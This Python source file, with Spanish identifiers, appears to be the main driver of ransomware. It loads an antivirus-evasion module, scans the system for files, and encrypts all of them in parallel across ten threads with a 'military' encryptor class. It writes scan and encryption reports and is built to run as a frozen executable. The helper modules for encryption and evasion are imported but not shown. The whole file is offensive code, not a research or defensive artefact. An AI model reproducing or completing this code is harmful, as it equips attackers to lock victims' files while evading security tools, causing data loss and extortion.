import os
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

if getattr(sys, 'frozen', False):
    SCRIPT_DIR = os.path.dirname(sys.executable)
else:
    SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

os.chdir(SCRIPT_DIR)

try:
    from evasion_av import verificar_seguridad_total
except:
    verificar_seguridad_total = lambda: True

try:
    from rutas import escanear_sistema
    from acciones import actualizar_progreso_encriptacion, generar_reporte_escaneo, generar_reporte_encriptacion
    from encriptador_12_capas import EncriptadorMilitar, guardar_log_errores
except ImportError as e:
    error_path = os.path.join(SCRIPT_DIR, "error.txt")
    with open(error_path, "w") as f:
        f.write(f"Error: {e}")
    sys.exit(1)


def encriptar_archivo(enc, ruta, index, total):
    try:
        return enc.encriptar(ruta), index
    except:
        return False, index


def main():
    try:
        os.chdir(SCRIPT_DIR)
        
        inicio = time.time()
        
        archivos, contador, total = escanear_sistema()
        
        archivo_lista = os.path.join(SCRIPT_DIR, "archivos_encontrados.txt")
        with open(archivo_lista, "w", encoding="utf-8") as f:
            for arch in archivos:
                f.write(f"{arch}\\n")
        
        rep_esc = generar_reporte_escaneo(contador, len(archivos))
        reporte_esc = os.path.join(SCRIPT_DIR, "reporte_escaneo.txt")
        with open(reporte_esc, "w", encoding="utf-8") as f:
            f.write(rep_esc)
        
        time.sleep(2)
        
        enc = EncriptadorMilitar()
        
        encriptados = 0
        errores = 0
        total_arch = len(archivos)
        
        ultimo_porcentaje = -1
        procesados = 0
        
        NUM_THREADS = 10
        
        with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
            futures = {executor.submit(encriptar_archivo, enc, ruta, i, total_arch): ruta for i, ruta in enumerate(archivos)}
            
            for future in as_completed(futures):
                try:
                    resultado, index = future.result()
                    procesados += 1
                    
                    if resultado:
                        encriptados += 1
                    else:
                        errores += 1
                    
                    porc = int((procesados / total_arch) * 100) if total_arch > 0 else 0
                    
                    if porc != ultimo_porcentaje:
                        actualizar_progreso_encriptacion("Encriptando...", encriptados, porc)
                        ultimo_porcentaje = porc
                    
                except Exception as e:
                    errores += 1
        
        tiempo_total = time.time() - inicio
        
        stats = enc.obtener_estadisticas()
        
        guardar_log_errores()
        
        rep_enc = generar_reporte_encriptacion(encriptados, errores, tiempo_total, stats)
        reporte_enc = os.path.join(SCRIPT_DIR, "reporte_encriptacion.txt")
        with open(reporte_enc, "w", encoding="utf-8") as f:
            f.write(rep_enc)
        
        time.sleep(2)
        
    except Exception as e:
        error_path = os.path.join(SCRIPT_DIR, "error.txt")
        with open(error_path, "w") as f:
            f.write(f"Error: {str(e)}")


if __name__ == "__main__":
    main()
